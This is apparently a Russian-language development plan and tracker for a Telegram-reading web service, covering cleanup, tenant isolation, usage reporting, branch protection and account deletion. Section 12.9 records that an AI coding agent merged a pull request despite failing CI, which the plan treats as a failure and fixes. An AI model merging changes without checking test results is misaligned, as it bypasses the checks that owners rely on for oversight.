- [ ] **10.1** Живой пользовательский сценарий с протоколом результатов *(пройдено: вход через Google, свои api_id/api_hash, подключение Telegram, два канала, опрос, дедупликация, лента, доставка. Осталось: LLM, n8n, расписание без вмешательства)* *(доступно: аноним получает 401 на закрытом, POST без CSRF — 403, cookie `Secure`+`Lax`, все шесть страниц SPA — 200)*
- [x] **10.2a** Readiness БД, heartbeat воркера, возраст `pending` — `GET /api/ops/health` + строка в «Журнале»
- [ ] **10.2b** Боевой перенос старой базы (действие оператора: нужны боевые `DATABASE_URL` и `APP_ENCRYPTION_KEY`)
- [x] **10.3** Полный набор гейтов на живом Postgres *(прогон 34137201000 на `main` 8aaa8cc: 448 passed, 4 skipped; pip-audit — уязвимостей нет; gitleaks — ни в истории, ни в дереве; ruff, mypy, bandit чисто)*
- [x] **Р1** Запушить два коммита, получить прогон CI
- [x] **Р2** Записи о 8.2 и 9.1 в `PROGRESS.md`
- [x] **Р3** Порядок коммитов миграций при подготовке PR *(ветка влита одним merge-коммитом: промежуточное состояние в `main` не попадает)*
- [x] **Р4** Вернуть русский язык в изменённые docstring'и и `DEPLOY.md` *(свип по `app/` и `scripts/`: английских docstring'ов не осталось)*

---

## 16. ФАЗА 12 — уборка долгов, найденных ревью 2026-09-10

Ревью после разворачивания дерева. Общая нить у всех находок одна: **код и
конфигурация пережили изменение, а сопровождающий их текст — нет.** Монолит
сняли задачей 7.4, но точка входа полторы фазы описывала его как настоящий;
раздел переименовали в 11.7, но правило стилей осталось на прежнем имени;
скрипты дореформенной эпохи никто не вызывает, а их зависимости до сих пор
ставятся в боевой образ. Ни одно из этого не ломается громко — оно тихо врёт.

Порядок ниже — по цене ошибки, а не по объёму работы.

### 12.1 Точка входа перестаёт врать — ✅ сделано 2026-09-10

`CLAUDE.md` описывал `server.py` как «весь бэкенд» и предлагал команду
`uvicorn server:app`, которая падает. Документ читается ПЕРВЫМ каждую сессию по
собственному протоколу, то есть неверную картину мира получал каждый, кто
протокол выполнял. Раздел «Текущее состояние» переписан по сверенному дереву
(17 таблиц, 11 модулей JS, два процесса, адреса прода), добавлен раздел «Крайне
важные факты» — потеря `APP_ENCRYPTION_KEY`, миграции до старта нового кода,
Docker как боевой путь, `AsyncSession` и `rollback()`, тесты как единственная
работающая проверка.

*Красный тест (`test_120`):* путь, названный в блоке команд, обязан
существовать; монолит не упоминается как существующий. Проверено на прежней
версии документа — краснеет.

### 12.2 Осиротевший остров: четыре скрипта и их хвост

`auth.py`, `reader.py`, `fetch_sample.py`, `create_user_session.py` — 353 строки
дореформенных CLI-инструментов поверх локальной SQLite и
`personal_account.session`. Их не вызывает никто, кроме друг друга. Хвост
дороже самих файлов: **только ради них** в боевом `requirements.txt` живут
`rich` (2.9 МБ) и `tabulate` — ставятся в каждый образ, чтобы обслуживать код,
который не запускается.

Решение владельца нужно по одному вопросу: удалить или перенести в
`scripts/legacy/` как справочный материал. Зависимости из боевого
`requirements.txt` уходят в любом случае — при переносе в `requirements-dev.txt`.

*Красный тест:* корень репозитория не содержит исполняемых скриптов вне
`scripts/`; `rich` и `tabulate` отсутствуют в боевых зависимостях.

**Вторая половина сделана 2026-09-13 (`test_128`), первая ждёт решения.**
Зависимости уходят при любом исходе, поэтому их не стали держать заложниками
выбора. `tabulate` оказался хуже, чем описано выше: его не импортирует **вообще
никто**, даже скрипты, — удалён совсем. `rich` переехал в
`requirements-dev.txt`; инструменты в корне работать не перестали, потому что
dev тянет боевой список целиком.

Закреплённое правило шире одного случая: каждый пакет боевого списка либо
импортируется кодом, который исполняют боевые процессы (`app/`, `alembic/`,
`scripts/`), либо назван в списке исключений **с причиной** — незаписанная
причина через полгода неотличима от забытого хвоста. Закрыта и обратная
сторона: объяснение, пережившее свой пакет, краснеет.

**Решение владельца 2026-09-13: удалить.** Скрипты сняты вместе с исключениями
в `ruff.toml` и зависимостью `rich` — держать её стало не для кого. Причина не в
объёме кода: их модель **противоречит архитектуре**. Все четыре работают с
локальным `.env` и файлом `personal_account.session`; сейчас сессии лежат в БД
зашифрованными, вход идёт через веб, и запуск такого скрипта дал бы второй
долгоживущий клиент на том же auth-key — `AUTH_KEY_DUPLICATED` у живого
аккаунта клиента. Правило на будущее закреплено в `test_03`: в корне нет
исполняемых `.py`, новый инструмент кладут в `scripts/`.

### 12.3 Мёртвый код в интерфейсе — ✅ сделано 2026-09-13

- `formatNextRun` (`static/js/render.js:107`) — экспортируется, не импортируется
  никем.
- Две ветки `item.photo_base64` (`static/js/feed.js:102`, `181`) — колонки нет в
  модели с задачи 5.4, `_LIST_FIELDS` исключает её явно. Ветка **не может**
  сработать: она читает поле, которого в ответе нет.

Вторая опаснее первой: она выглядит как рабочий запасной путь для аватарки и
маскирует то, что запасного пути на самом деле нет. Именно под её прикрытием
дефект с буквой вместо аватарки прожил всю фазу 11.

*Красный тест:* экспорт без импорта — нарушение; интерфейс не читает полей,
которых нет в `_LIST_FIELDS` API.

**Сделано 2026-09-13 (`test_122`). Список выше оказался неполным: свип нашёл
три мёртвых экспорта, а не один.** Кроме `formatNextRun` — `esc` (`render.js`)
и `mergeMessages` (`messages.js`). Последний дороже прочих: он вливал в таблицу
посты **синхронного** прогона монолита, а прогон с 11.6 асинхронный (202
`queued`, работу делает воркер). Функция пережила архитектуру, а комментарий в
шапке `messages.js` всё ещё описывал ребро `channels → messages`, которого нет,
— и единственная ссылка на `mergeMessages` жила именно в этом комментарии.
Поэтому сканер в `test_122` комментарии за использование не считает, и это
закреплено отдельным self-test'ом.

Маркер `esc(` убран и из `ESCAPING_CALLS` в `test_02`: маркер живёт дольше
кода, и сканер XSS благословлял бы вызов функции, которой в `render.js` больше
нет, — то есть признавал бы безопасным `ReferenceError`.

### 12.4 Следы монолита в конфигурации — ✅ сделано 2026-09-13

`ruff.toml:11` исключает `server.py` из линтинга, `.dockerignore` и
`Dockerfile:22` — из образа, `Procfile:1` его комментирует. Файла нет. Само по
себе безвредно, но это ровно те следы, по которым читатель заключает, что
монолит ещё на месте, — и по которым его заключил `CLAUDE.md`.

*Красный тест:* исключение в конфигурации не смеет ссылаться на несуществующий
путь (тот же принцип, что `test_118` для мёртвого правила стилей).

**Сделано 2026-09-13 (`test_123`). Следы оказались разной природы, и лечатся
по-разному.** Исключение из `ruff.toml` убрано совсем: разрешение не проверять,
выданное пустому месту, не сработает и не пожалуется. Правило `server.py` в
`.dockerignore` **оставлено** — снимать страховку не за что: `COPY . .` заберёт
всё, что окажется в контексте, стоит правило одну строку, а `test_70` держит его
как глубину защиты; врать оно перестало прошедшим временем в комментарии, а не
удалением. Комментарии `Dockerfile`, `Procfile`, `.dockerignore` и докстроки
`test_70` переписаны на «снят задачей 7.4, проверка — заслон на случай возврата».

Побочное следствие, полезное для 12.2: правило «буквальное исключение из линта
обязано быть в `git ls-files`» **сцепляет** `ruff.toml` с судьбой четырёх
скриптов — перенести или удалить их, не поправив конфигурацию, теперь нельзя.

### 12.5 Документы-сироты — ✅ сделано 2026-09-13

`DESIGN-webflow.md` (28 КБ) и `Telegram_Parser_Telethon.md` (24 КБ) — ни один
документ на них не ссылается, оба уезжают в образ. Решить: включить в карту
документов `CLAUDE.md` или убрать в `private-backups/`.

*Красный тест:* каждый `.md` в корне либо назван в карте документов, либо
отсутствует.

**Сделано 2026-09-13 (`test_129`), решение владельца.** «Сирота» оказалось
слишком грубым словом для одного из двух: `DESIGN-webflow.md` — **источник
дизайн-системы**, палитра `static/css/main.css` взята оттуда дословно. Документ
не осиротел, на него просто никто не сослался, и это разные беды с разным
лечением. Внесён в карту с пометкой, что цвета правят там же.
`Telegram_Parser_Telethon.md` переехал в `private-backups/`.

Заодно в карту внесены `PLAN.md`, `PLAN_REFINEMENT.md` и `GEMINI.md`: они тоже
лежали в корне без объяснения, просто их никто не назвал сиротами.

### 12.6 Правило `TenantRepo` против кода — ✅ сделано 2026-09-13

`AGENTS.md` требует: «запросы через `TenantRepo`, не писать `WHERE user_id = ...`
руками». В коде **десять** ручных мест: `app/api/telegram.py` (пять),
`app/api/auth.py`, `app/services/tg_attempts.py`, `app/services/llm.py`.

Все они — по собственным записям пользователя (сессия, попытка входа, аккаунт),
а не по тенантным ресурсам, то есть похоже на негласное исключение. Но в
правиле его нет, и любой, кто следует `AGENTS.md` буквально, видит десять
нарушений и не знает, можно ли ему так же. **Правило и код обязаны сойтись** —
либо исключение записывается явно, либо код переводится на `TenantRepo`.

*Красный тест:* свип по ручным `user_id ==` разрешает только места, названные в
исключении, и краснеет на новых.

**Сделано 2026-09-13 (`test_124`). Мест не десять, а двадцать** — счёт в
абзаце выше взят по старому дереву. Граница проведена по свойству кода, а не по
списку файлов: **есть `repo` в функции — ручной фильтр запрещён**. Таких мест
семь, все переведены на `repo.query()` / новый `repo.delete()`. Парного метода
для удаления не было вовсе, и это не мелочь симметрии: забытый `where` в чтении
отдаёт чужое, забытый `where` в удалении стирает данные всем клиентам разом.

Оставшиеся двенадцать — там, где репозитория нет на руках: службы
`app/services/` (им `user_id` передают аргументом, зовёт их воркер) и
доавторизационные пути `auth.py` / `telegram.py` (собственные записи
пользователя — сессия, попытка входа, привязка аккаунта). Исключение записано в
`AGENTS.md` §5 в форме, которую нельзя растянуть, а `test_124` проверяет
свойство; список файлов закреплён отдельно, чтобы не рос молча.

### 12.7 Расход токенов в разрезе источника и канала — ✅ сделано 2026-09-13

Отложено осознанно в 11.8. Сейчас `llm_usage` считает на пользователя, а решение
о лимитах принимается **на канал**: непонятно, какой канал жжёт бюджет. Нужен
разрез, а значит своя схема — поэтому задача отдельная, а не хвост фазы 11.

*Красный тест:* прогон источника оставляет расход с привязкой к источнику и
каналу; сумма по каналам сходится с расходом пользователя.

**Сделано 2026-09-13 (`test_126`, ревизия `0015`).** Три решения, каждое из
которых можно было принять неверно и узнать об этом дорого:

1. **Отдельная таблица, а не колонки в `llm_usage`.** Месячный гейт читает одну
   строку на (тенант, период) через `scalar_one_or_none`; строки по каналам в
   той же таблице уронили бы его на второй. Счётчик, на котором держится защита
   от неограниченного счёта, ломать ради отчёта нельзя.
2. **Источник назван публичным id, а не внешним ключом.** Ключ дал бы либо
   каскад — история трат исчезает вместе с источником, — либо отказ удаления.
   Плюс контракт 9.10: наружу внутренние BIGINT не отдаются, а строки эти и
   заводятся ради показа.
3. **Оба счётчика пишутся в одной транзакции.** Разрез, не сходящийся с общим
   расходом, хуже отсутствия разреза: по нему принимают решение, какой канал
   отключить. Сходимость закреплена отдельным тестом.

Сквозная проверка гоняет настоящий `poll_source`, подменяя только обращение к
модели: половины стыка порознь мало — ошибка передачи адреса выглядела бы как
исправно работающий отчёт, в котором всё свалено в «вне источника». Проверено
снятием параметра — краснеет.

Добавлен `GET /api/usage` (всего, по источникам, по каналам, по убыванию).
**Показ в интерфейсе намеренно не сделан здесь** — задача 12.10.

### 12.10 Расход показать в интерфейсе — ✅ сделано 2026-09-13

Данные есть и отдаются `GET /api/usage`, но в SPA до них не дойти. Пока до них
не дойти, вопрос «какой канал жжёт бюджет» отвечен только для того, кто умеет
звать API руками, — то есть не отвечен.

*Красный тест:* вкладка показывает расход за период и каналы по убыванию;
пустой расход — это видимое «пока ничего не потрачено», а не пустое место.

**Сделано 2026-09-13 (`test_127`).** Карточка встала во вкладке «Интеграции»
рядом с ключом и моделью: решение «какой канал отключить» принимают там же, где
включают AI. Разметку строит `usage.js`, главная функция которого **чистая** —
данные на входе, строка на выходе, — и потому исполняется в node. Каналы не
пересортировываются: порядок задаёт сервер, два разных порядка на одни данные —
два разных ответа.

### 12.8 SPA: единый перехват 5xx и офлайн — ✅ сделано 2026-09-13

Сейчас перехватывается только 401. При 5xx и без сети интерфейс молчит — тот же
класс отказа, что ловился всю фазу 9: «ничего не найдено» и «не смогли
посмотреть» выглядят одинаково.

*Красный тест:* ответ 5xx и оборванная сеть дают видимое состояние, а не тишину.

**Сделано 2026-09-13 (`test_125`).** Ключевое решение: **не тост.** Тост живёт
три секунды, а сервер лежит минутами — состояние обязано держаться, пока не
пройдёт успешный запрос. Наверху появилась полоса, одна на всё приложение
(иначе вернётся та самая стена сообщений, из-за которой в сентябре и завели
единый перехват 401). Обрыв сети вдобавок подменяет текст ошибки: вызывающий
код показывает `e.message`, а браузер говорит `Failed to fetch` — подмена
сделана в одном месте, а не в двадцати `catch`-блоках.

Проверка поведенческая: node с подставными `fetch` и `document` прогоняет
четыре исхода подряд — 200, 500, обрыв, снова 200. Regex ответил бы на вопрос
«есть ли в файле нужные слова», а спросить надо «что увидит человек».

**Регрессия, пойманная по дороге.** Поиск элемента на верхнем уровне модуля
сделал `api.js` неимпортируемым без DOM и уронил `test_102` — тот гоняет
`secrets.js` в node, а он тянет `api.js`; на этом свойстве стоит проверка, что
именно уходит на сервер из формы с маской. Поиск перенесён в момент показа,
само свойство закреплено отдельным тестом.

### Что ждёт владельца, а не агента

Не входит в фазу 12, потому что упирается не в код: **8.6b** (промпты каналов
не проверены — в кабинете не задан ключ OpenRouter), **10.1** (живой сценарий:
осталось LLM, n8n, расписание без вмешательства), **10.2b** (боевой перенос
старой базы — нужны боевые `DATABASE_URL` и `APP_ENCRYPTION_KEY`), **0.2**
(перевыпуск ключей перед публичным запуском — отклонён оператором), HSTS
`includeSubDomains` после подключения своего домена.

### Трекер фазы 12

- [x] **12.1** Точка входа перестаёт врать *(2026-09-10, `test_120`)*
- [x] **12.2** Осиротевший остров: четыре скрипта удалены, `rich` и `tabulate` тоже *(2026-09-13, решение владельца; `test_03`, `test_128`)*
- [x] **12.3** Мёртвый код интерфейса: три мёртвых экспорта (`formatNextRun`, `esc`, `mergeMessages`) и две ветки `photo_base64` *(2026-09-13, `test_122`)*
- [x] **12.4** Следы монолита в `ruff.toml`, `Dockerfile`, `.dockerignore`, `Procfile` *(2026-09-13, `test_123`)*
- [x] **12.5** Документы-сироты: `DESIGN-webflow.md` в карту (он — источник дизайн-системы), исследование по Telethon в архив *(2026-09-13, решение владельца; `test_129`)*
- [x] **12.6** Правило `TenantRepo` и код обязаны сойтись *(2026-09-13, `test_124`, добавлен `TenantRepo.delete()`)*
- [x] **12.7** Расход токенов в разрезе источника и канала *(2026-09-13, `test_126`, ревизия `0015`, `GET /api/usage`)*
- [x] **12.8** SPA: единый перехват 5xx и офлайн *(2026-09-13, `test_125`)*
- [x] **12.9** Защита ветки `main`: CI обязателен к прохождению перед слиянием *(2026-09-13, `scripts/protect-main.sh`, строго — включая админов)*
- [x] **12.10** Расход показать в интерфейсе *(2026-09-13, `test_127`)*

### 12.9 CI ничего не гарантирует, пока не обязателен

Найдено 2026-09-10 самым дорогим способом: слияние PR #45 прошло при **красном**
`test`. У ветки `main` нет защиты вовсе (`gh api .../branches/main/protection` →
404), то есть все пять джобов — совещательные. Вся дисциплина проекта держится
на тестах, а в точке, где они должны решать, их никто не спрашивает.

Отдельно виновата и привычка агента: слияние вызывалось сразу после ожидания,
без проверки исхода. Это чинится обеими сторонами — правилом в `CLAUDE.md` и
защитой ветки, но полагаться надо на вторую: правило забывается, настройка нет.

*Красный тест:* проверяется настройкой GitHub, а не pytest — требуется
`required_status_checks` со списком из пяти джобов.

**Подготовлено 2026-09-13: `scripts/protect-main.sh`.** Включение — одна
команда, состояние видно `--status`, снимается `--remove`. Две настройки в нём
неочевидны и выбраны осознанно:

- **Обзор (review) не требуется.** Второго человека в проекте нет; требование
  ревью остановило бы выкладку насовсем, а не сделало её строже.
- **`strict` выключен.** Он требует, чтобы ветка была свежее `main`, то есть
  каждый PR пришлось бы перебазировать вручную ради проверки, которая о
  качестве кода не говорит ничего.

Главный выбор остаётся за владельцем и сводится к `enforce_admins`. Без него
защита не мешает ровно тем, кто уже нарушал правило: и агент, и владелец —
администраторы, и GitHub их пропустит. С ним заслон настоящий — но и владелец
больше не сольёт мимо красного CI, даже когда очень надо.

---

## 17. ФАЗА 13 — что нужно публичному сервису

Фаза 12 убрала долги, оставшиеся от переезда. Дальше открывается другой
разрыв, и он не в коде: **приложение работает, но им ещё нельзя пользоваться
чужому человеку.** Всё, что ниже, — не улучшения, а то, без чего сервис,
читающий чужую переписку, не имеет права называться публичным.

Два пункта прямо названы в разделе 13 («Открытые вопросы») и не закрыты до сих
пор — их просто не переносили в трекер, и они выпали из поля зрения.

Порядок — по цене ошибки, а не по объёму работы.

### 13.1 Человек должен знать, чем рискует — ✅ сделано 2026-09-14

Открытый вопрос №3 плана, не закрыт. При подключении Telegram сервис получает
**доступ на чтение всей переписки** пользователя, а массовая автоматизация
пользовательских аккаунтов — серая зона ToS Telegram: аккаунт могут
ограничить. В модалке MTProto об этом **ни слова** — там только поля api_id,
api_hash и телефон.

Цена ошибки здесь не техническая. Человек отдаёт доступ к личному аккаунту,
не зная ни объёма доступа, ни риска для самого аккаунта, — и узнаёт об этом в
день, когда Telegram его ограничит.

*Красный тест:* экран подключения называет объём доступа и риск ограничения
до того, как принять номер телефона; подтверждение — осознанное действие, а не
галочка по умолчанию.

### 13.2 Уйти и забрать своё — ✅ сделано 2026-09-14

Открытый вопрос №4 плана, закрыт наполовину: автоочистка по сроку есть,
**удаления аккаунта и экспорта данных нет**. `app/api/auth.py` знает только
`/auth/me` и `/auth/logout`.

Для этого сервиса удаление — не вежливость, а **способ отозвать доступ**: на
сервере лежит MTProto-сессия живого аккаунта, и сегодня единственный путь её
убрать — попросить владельца почистить базу руками. Удаление обязано
**завершать сессию в Telegram**, а не только стирать строку: строка без
`log_out` оставляет сервису рабочий доступ к аккаунту, который человек считает
отключённым.

*Красный тест:* удаление аккаунта убивает MTProto-сессию в Telegram и все
тенантные строки; экспорт отдаёт ленту, источники и журнал в машинночитаемом
виде; чужой аккаунт этими ручками не трогается (404, не 403).

### 13.3 Молчащий воркер должен кого-то будить — ✅ сделано 2026-09-14

`GET /api/ops/health` знает про базу, heartbeat воркера и возраст очереди
(10.2a). Но это **опрос**: чтобы узнать об отказе, надо зайти и посмотреть.
А сам план называет молчащий воркер самым вероятным отказом этой архитектуры.

Пока никто не смотрит, отказ выглядит как «сегодня ничего не нашлось» — ровно
тот класс, который ловили всю фазу 9 и закрыли в интерфейсе задачей 12.8.
Снаружи он всё ещё не виден.

*Красный тест:* остановленный воркер и застоявшаяся очередь дают видимый
сигнал владельцу без его участия; сигнал не повторяется каждую минуту.

### 13.4 План перестаёт врать о себе — ✅ сделано 2026-09-14

Раздел 14 описывал состояние, которого давно нет: задача 9.4 помечена жёлтым,
хотя её красный тест `test_83` зелёный (23 passed); «требование проверить на
настоящем Postgres не выполнено» — в CI поднимается `postgres:16` и задан
`TEST_DATABASE_URL`; «`GET /health` — по-прежнему заглушка» — задача 10.2a
сделана; финальные проверки названы не начатыми, хотя в трекере отмечены
сделанными; «четыре ручных фильтра по `user_id`» в `dispatch.py`,
`tg_gateway.py`, `worker.py` — их там нет ни одного.

Это ровно тот класс, что 12.1, 12.4 и 12.5: **текст пережил код и продолжает
утверждать обратное.** Разница в том, что здесь врёт сам план — документ, с
которого начинается каждая сессия.

*Красный тест:* утверждение о состоянии в прозе плана не противоречит трекеру
и проверяемым фактам (аналог `test_120` для точки входа).

### 13.5 Лимит расхода на канал — ✅ сделано 2026-09-14

Задача 12.7 дала разрез: видно, какой канал жжёт бюджет. Но потолок
по-прежнему один на тенанта, то есть увидеть виновника можно, а ограничить
его — нет. Логичное продолжение, и **не раньше** остальных пунктов: это
улучшение, а не условие запуска.

*Красный тест:* канал с собственным потолком перестаёт тратить по его
достижении, остальные каналы источника продолжают работать.

### 13.6 Проверка источников — ✅ сделано 2026-09-14

Заказ владельца после разбора «VASILE LUNGO | INSIDER». Тот канал не
разрешался **ни разу с момента добавления**, и узнать об этом было неоткуда:
источник просто не давал находок. Между «в канале сегодня пусто» и «канал не
открывался никогда» интерфейс не различал ничего — молчание выглядело
одинаково.

Проверка отвечает на один вопрос по каждому каналу: **сможет ли прогон
прочитать отсюда сообщения.** Идёт она ТЕМ ЖЕ путём, что и прогон — через
`_resolve_channel` со всеми его запасными ходами и прогревом кэша. Проверка,
которая разрешает канал по-своему, проверяет себя, а не прогон; это та же
ошибка, что тест, сеющий данные, которых писатель не пишет (11.9).

*Красный тест:* канал, который не разрешается, назван неразрешимым с причиной;
здоровый — здоровым; проба не съедает дедупликацию.

### 13.7 Свёрнутая плашка канала — ✅ сделано 2026-09-14

Находка владельца: у «ТОП-вакансий» девять каналов, и каждый нарисован
развёрнутым — имя, «Лимит», «Токены», корзина и поле промпта на три строки.
Чтобы дойти до девятого, надо прокрутить мимо восьми полей, которые сейчас не
нужны.

**Почему так вышло.** Модалку построила задача 11.7, когда у источника был
ровно ОДИН канал: ревизия `0012` превратила каждый прежний монитор в источник
с единственным каналом. Для N=1 развёрнутый вид правильный; он деградирует
линейно и при N=9 непригоден. Ограничение «до 10 каналов» записано в этом плане
с самого начала — но ни разу не было использовано как случай для проверки
интерфейса, и покраснеть было нечему: все свипы интерфейса здесь про
ПРАВИЛЬНОСТЬ, а «непригодно при девяти строках» — про СООТВЕТСТВИЕ.

*Красный тест:* свёрнутая строка несёт все поля, которые читает сохранение;
промпт скрыт разметкой; удаление спрашивает; значки показывают то, что будет
сохранено.

### 13.8 Сверка с дизайн-документом — ✅ сделано 2026-09-15

Заказ владельца: «прочитай design.md и проверь, насколько интерфейс
соответствует тому, что реально реализовано». Файла `design.md` в корне нет —
источник дизайн-системы называется `DESIGN-webflow.md`, это выяснила 12.5, и
сверялись с ним.

Сверка нашла не разъехавшиеся отступы, а **вторую систему**: экраны входа —
первое, что видит человек, — несли собственный `:root` с цветом `#5533ff`,
которого в документе нет вовсе. Рядом: `--rounded-xs` и `--hairline-strong`
использовались, но нигде не объявлялись, и `border-radius` текстовых полей
молча отбрасывался; шкал отступов и текста не существовало вовсе — 41 разный
`padding`, 17 размеров шрифта, включая 12.5, 11.5 и 10.5 пикселя; 199
инлайновых стилей обходили систему целиком.

**Почему документ разошёлся с кодом.** Он полгода лежал в корне без единой
ссылки на себя и выглядел мусором — в карту документов его внесла только 12.5.
Ни одна проверка не спрашивала, совпадает ли `main.css` с документом, а
«интерфейсная красота» — не то, на чём краснеют существующие свипы: они про
ПРАВИЛЬНОСТЬ разметки, соответствие же — про СООТВЕТСТВИЕ, и ловить его нечем,
пока документ не разобран машиной.

Восемь шагов, каждый отдельным PR и откатываемый в одиночку. Побочный выигрыш
дошёл до конца: `style-src 'unsafe-inline'` держался **только** на инлайновых
стилях, инлайнов не осталось ни одного — разрешение снято.

*Красный тест:* каждый токен документа существует в `main.css` с тем же
значением; ни один `var(--x)` не остаётся без объявления; литералы цвета,
отступа и размера — только из реестра с причиной; инлайновых стилей ноль.

### Трекер фазы 13

- [x] **13.1** Человек должен знать, чем рискует *(2026-09-14, `test_133`; открытый вопрос №3 закрыт)*
- [x] **13.2** Удаление аккаунта и экспорт данных *(2026-09-14, `test_134`; открытый вопрос №4 закрыт)*
- [x] **13.3** Молчащий воркер должен кого-то будить *(2026-09-14, `test_131`, тревога в бота владельца)*
- [x] **13.4** План перестаёт врать о себе *(2026-09-14, `test_132`)*
- [x] **13.5** Лимит расхода на канал *(2026-09-14, `test_135`, ревизия `0016`)*
- [x] **13.6** Проверка источников *(2026-09-14, `test_139`, ревизия `0018`)*
- [x] **13.7** Свёрнутая плашка канала *(2026-09-14, `test_140`)*
- [x] **13.8** Сверка с дизайн-документом *(2026-09-15, `test_141`, восемь шагов: PR #74–#82; регрессия кнопки Google — #83)*
- [x] **13.9** Сборка находок кодом *(2026-09-15, `test_146`, ревизия `0019`)*
- [x] **13.10** Перенос строки в богатом сообщении *(2026-09-16, `test_148`)*
- [x] **13.11** Молчание модели стоило каналу постов *(2026-09-16, `test_149`)*
- [x] **13.12** Теги из документации приезжали буквами *(2026-09-16, `test_150`)*
- [x] **13.13** Пост из бота ронял весь канал *(2026-09-17, `test_151`)*
- [x] **13.14** Отказ входа через Google не называл причину *(2026-09-24, `test_152`; домен в Firebase добавляет владелец)*
- [x] **13.15** Отказ почты молчал и выдавал аккаунт *(2026-09-24, `test_153`; `MAIL_FROM` и `APP_BASE_URL` задаёт владелец)*
